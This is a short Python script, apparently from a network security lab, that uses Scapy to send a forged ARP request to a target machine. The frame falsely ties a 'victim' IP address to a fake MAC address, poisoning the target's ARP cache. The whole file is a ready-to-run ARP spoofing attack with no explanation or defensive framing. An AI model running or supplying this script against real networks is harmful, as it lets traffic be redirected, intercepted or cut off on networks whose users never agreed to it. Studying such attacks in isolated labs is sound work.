from scapy.all import *
VM_target_IP = "172.16.51.61"
VM_target_MAC = "26:e7:78:60:ff:f7"
VICTIM_IP = "192.16.50.100"
FAKE_MAC = "6e:ee:f8:11:50:e9"
print("sending spoofed ARP REQUEST …")
ether = Ether()
ether.dst = VM_target_MAC
ether.src = FAKE_MAC
arp = ARP()
arp.psrc = VICTIM_IP
arp.hwsrc = FAKE_MAC
arp.pdst = VM_target_IP
arp.op = 1
frame = ether/arp
sendp(frame)
